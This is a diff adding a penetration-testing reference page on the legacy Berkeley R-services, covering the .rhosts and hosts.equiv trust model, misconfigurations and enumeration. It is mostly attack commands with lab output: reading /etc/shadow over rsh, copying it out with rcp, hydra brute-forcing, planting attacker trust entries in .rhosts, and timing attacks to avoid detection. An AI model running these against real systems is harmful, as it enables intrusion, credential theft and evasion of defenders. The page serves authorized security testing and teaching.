@@ -1,0 +1,284 @@
+---
+title: R-services
+description: Berkeley R-services (rlogin/rsh/rexec) on ports 512/513/514 - host-based trust enumeration via .rhosts and hosts.equiv, exploiting trusted-host relationships, and the rwho/rusers information disclosure.
+mitre: [T1046, T1199, T1018, T1078]
+d3fend: [D3-NTA]
+impact: [InternalAccess, CredentialTheft]
+sidebar:
+  order: 15
+  label: R-services
+---
+
+## TL;DR
+
+The Berkeley R-services - `rlogin`, `rsh`, `rexec`, and the auxiliary `rwho`/`rusers` - are pre-SSH remote-access protocols designed for trusted Unix networks in the 1980s. They authenticate by *source host*, not by user - if the server trusts `clienthost.example.com`, anyone connecting from `clienthost` claiming to be user `alice` is granted access as `alice`. Plaintext. No encryption. No real authentication. **Anywhere you find these running, it's either a relic or a finding.**
+
+```
+# 1. Service scan - the trio of R-services
+nmap -sV -p512,513,514 <target>
+
+# 2. Information disclosure: who's logged in
+rusers -al <target>     # remote users + idle time
+rwho                    # similar, broadcasts to local subnet
+
+# 3. Try direct login (rlogin)
+rlogin -l root <target>
+
+# 4. Run a command (rsh)
+rsh -l root <target> id
+
+# 5. With explicit password (rexec)
+rexec -l root <target> id
+```
+
+Success indicator: any login succeeds without password (host-trust misconfiguration), or `rusers` returns a list of currently-logged-in users.
+
+## Protocol overview
+
+| Service | Port | Protocol detail |
+| --- | --- | --- |
+| **`rexec`** | TCP 512 | Run one command on the remote host. Sends username + password + command in plaintext. |
+| **`rlogin`** | TCP 513 | Interactive login shell. If trust is configured, no password prompt. |
+| **`rsh`** | TCP 514 | Run one command. If trust is configured, no password prompt. |
+| **`rwho`** | UDP 513 | Broadcasts which users are logged in on the local network. |
+| **`rusers`** | RPC (port from portmapper) | Returns logged-in users from a remote host. |
+| **`rcp`** | Uses `rsh` (TCP 514) | Remote file copy. |
+
+The protocols themselves are tiny - `rlogin` is essentially "send the username, optionally a TTY type, optionally a window size; everything else is a transparent character stream." `rsh` is even simpler - "send the local username, the remote username, and the command to run."
+
+### The trust model
+
+When `rlogin`/`rsh` are configured to bypass passwords, the daemon checks two files on the *server* (target) side:
+
+| File | Scope | Format |
+| --- | --- | --- |
+| `/etc/hosts.equiv` | System-wide | One line per trusted host. Any user on that host can log in as the *same-named* user on this host. |
+| `~/.rhosts` | Per-user | One line per trusted (hostname, username) pair. Anyone on that host as that user can log in as the owner of the `.rhosts`. |
+
+Example `/etc/hosts.equiv`:
+
+```
+client1.example.com
+client2.example.com
+```
+
+Means: any non-root user on `client1.example.com` can `rlogin` to this host as the same-named user without a password. (Note: `hosts.equiv` does not grant root access; root requires `/.rhosts`.)
+
+Example `~alice/.rhosts`:
+
+```
+bob-laptop.example.com bob
+client1.example.com    alice
++  +
+```
+
+Lines 1-2: trust `bob` on `bob-laptop` and `alice` on `client1`, both able to login as `alice` here.
+
+Line 3 (`+ +`): the security disaster. **Any user on any host** can log in as `alice` without a password. This pattern was historically a recommended setting in some HP-UX and IBM AIX installation guides, and copy-paste configurations from those guides still exist in the wild.
+
+A `+` in the hostname field = any host. A `+` in the username field = any user. `+ +` = "trust everything."
+
+### Connections come from low ports
+
+R-services check that the *source port* is below 1024 (a "trusted port" because non-root users can't bind to it on Unix). This was security in the 1980s - only root on the source host could initiate. It's not security in the 2020s because anyone with root on a single Linux box can craft such packets at will.
+
+## Default configuration
+
+Modern Linux distros don't even ship the R-service daemons. You have to install `rsh-server`, `inetutils-inetd`, or similar - and then explicitly enable them in inetd/xinetd:
+
+```
+# /etc/inetd.conf
+shell  stream tcp nowait root  /usr/sbin/tcpd  in.rshd -L
+login  stream tcp nowait root  /usr/sbin/tcpd  in.rlogind
+exec   stream tcp nowait root  /usr/sbin/tcpd  in.rexecd
+```
+
+When you encounter R-services on a target today, it's almost always one of:
+
+1. A legacy Unix system (Solaris, HP-UX, AIX) that has never been modernized
+2. An embedded device or appliance whose vendor never updated to SSH
+3. A deliberate honeypot
+
+In all three cases, the engagement value is high - the protocol's design guarantees credential-free access if trust is configured at all, and credential-grabbing if password auth is used (because it's plaintext).
+
+## Dangerous settings
+
+| Setting | Why it's bad |
+| --- | --- |
+| `+ +` in `/etc/hosts.equiv` | Any user on any host can log in (except root) |
+| `+ +` in `/.rhosts` (root's) | **Anyone can log in as root** |
+| `+ +` in user `.rhosts` | Anyone can log in as that user |
+| Wildcard `+` in hostname field | "trust this user from anywhere" |
+| Wildcard `+` in username field | "trust any user from this host as me" |
+| `.rhosts` writable by anyone other than the owner | An attacker can plant their own trust entry |
+| R-services exposed to public internet | Plaintext credentials + non-existent auth = trivial compromise |
+| `rusers` / `rwho` exposed externally | User-enumeration primitive |
+
+## Footprinting commands
+
+### Service scan
+
+```shell
+sudo nmap -sV -p512,513,514 10.129.14.128
+```
+
+```
+PORT    STATE SERVICE EXTERNAL-VERSION
+512/tcp open  exec    netkit-rsh rexecd
+513/tcp open  login   OpenBSD or Solaris rlogind
+514/tcp open  shell   Netkit rshd
+```
+
+Three open R-service ports = all three daemons running. Each is independently enumerable.
+
+### User enumeration via rusers
+
+```shell
+rusers -al 10.129.14.128
+```
+
+```
+htb-student     10.129.14.128:console     Sep 16 14:11      :01
+admin           10.129.14.128:pts/0       Sep 16 14:35
+backup          10.129.14.128:pts/1       Sep 16 13:21
+```
+
+`-a` shows all users (default omits idle accounts), `-l` long format.
+
+`rwho` is similar but listens for broadcasts instead of actively querying - useful on shared subnets to passively map who's logged in where:
+
+```shell
+rwho
+```
+
+Both are user-enumeration primitives without any authentication required. Treat the user list as input to password-spray and to .rhosts hunting.
+
+### rlogin
+
+```shell
+rlogin -l root 10.129.14.128
+```
+
+If `/.rhosts` has `+ +`:
+
+```
+Last login: Wed Sep 16 14:11:01 from 10.129.14.10
+root@target:~#
+```
+
+You're root, no password, no audit trail beyond the connection log.
+
+If trust isn't configured, you get a password prompt - same plaintext-credential exposure as rexec.
+
+To try non-root accounts iteratively:
+
+```shell
+for user in $(cat users.txt); do
+  echo "=== $user ==="
+  rlogin -l "$user" 10.129.14.128 -e ~. 2>&1 | head -3
+done
+```
+
+`-e ~.` sets the escape sequence to `~.` (the default) so you can break out of stuck sessions.
+
+### rsh - one-shot command execution
+
+```shell
+rsh -l root 10.129.14.128 'id; uname -a; cat /etc/shadow'
+```
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+Linux target 4.15.0-...
+root:$6$...
+daemon:*:...
+```
+
+`rsh` runs one command and returns. With trust configured for root, this is `xp_cmdshell` for Unix - full remote command execution. The output streams back over the same connection.
+
+`rcp` (built on `rsh`) copies files:
+
+```shell
+rcp /etc/passwd root@10.129.14.128:/tmp/stolen-passwd     # copy local to remote
+rcp root@10.129.14.128:/etc/shadow /tmp/                  # copy remote to local
+```
+
+### rexec - credentialed command execution
+
+```shell
+rexec -l root 10.129.14.128 id
+Password:        # prompts for password (plaintext on the wire)
+uid=0(root) gid=0(root)
+```
+
+`rexec` always requires credentials - no .rhosts bypass. But it transmits them in cleartext, so anyone sniffing the network captures them.
+
+### Brute-force
+
+```shell
+hydra -L users.txt -P passwords.txt rexec://10.129.14.128
+hydra -L users.txt -P passwords.txt rlogin://10.129.14.128
+hydra -L users.txt -P passwords.txt rsh://10.129.14.128
+```
+
+Hydra has separate modules for each. R-services typically don't implement rate-limiting (the protocols are too old to have had it bolted on), making brute-force feasible.
+
+### Detecting `.rhosts` from credentialed access
+
+When you've gained access by *any* means (rlogin trust, brute-force, or a different service entirely), check for further trust to abuse:
+
+```shell
+# All users' .rhosts files
+cat /etc/hosts.equiv
+find /home -name .rhosts -exec ls -la {} \; -exec cat {} \;
+find /root -name .rhosts -exec ls -la {} \; -exec cat {} \;
+```
+
+A `+` in any of these means more lateral movement is available.
+
+### NSE scripts
+
+```shell
+nmap -p512,513,514 --script "rusers" 10.129.14.128
+nmap -p512,513,514 --script "rexec-brute" --script-args userdb=u,passdb=p 10.129.14.128
+nmap -p512,513,514 --script "rlogin-brute" --script-args userdb=u,passdb=p 10.129.14.128
+```
+
+## Common chained workflows
+
+**rusers user list → rlogin trust check:**
+1. `rusers -al target` returns user list
+2. For each user, try `rlogin -l <user> target`
+3. Trust-bypass logins succeed silently - credentials never prompted
+
+**Sniff rexec creds → reuse on SSH:**
+1. Any rexec session sends username+password in plaintext
+2. Intercepting that traffic (ARP spoof on the local subnet, mirror port, or just being any router on the path) yields credentials
+3. Same credentials work on SSH, FTP, mail - same human, same password
+
+**`.rhosts` write → trust insertion:**
+1. NFS export (see [NFS](/codex/network/services/nfs/)) or rsync writable share contains `~user/.rhosts` writable
+2. Write `+ <attacker-host> +` into it
+3. From your attack host, `rlogin -l <user> target` - no password needed
+
+**Internal subnet rwho passive mapping:**
+1. Listen for rwho broadcasts on the local subnet (UDP 513, broadcast)
+2. Build a map of "which users are logged in to which hosts right now"
+3. Use that map to time engagements - attack hosts when admin users aren't logged in to reduce detection risk
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -sV -p512,513,514 <target>` |
+| User enumeration | `rusers -al <target>` |
+| Subnet passive map | `rwho` (listens for broadcasts) |
+| rlogin (try trust) | `rlogin -l <user> <target>` |
+| rsh one-shot command | `rsh -l <user> <target> '<cmd>'` |
+| rexec with password | `rexec -l <user> <target> '<cmd>'` (prompts for pw) |
+| rcp upload | `rcp <local> <user>@<target>:<remote>` |
+| rcp download | `rcp <user>@<target>:<remote> <local>` |
+| Brute force rexec | `hydra -L u -P p rexec://<target>` |
+| Brute force rlogin | `hydra -L u -P p rlogin://<target>` |
+| Find trust files (post-access) | `find / -name .rhosts -ls 2>/dev/null` |
+| Read hosts.equiv | `cat /etc/hosts.equiv` |
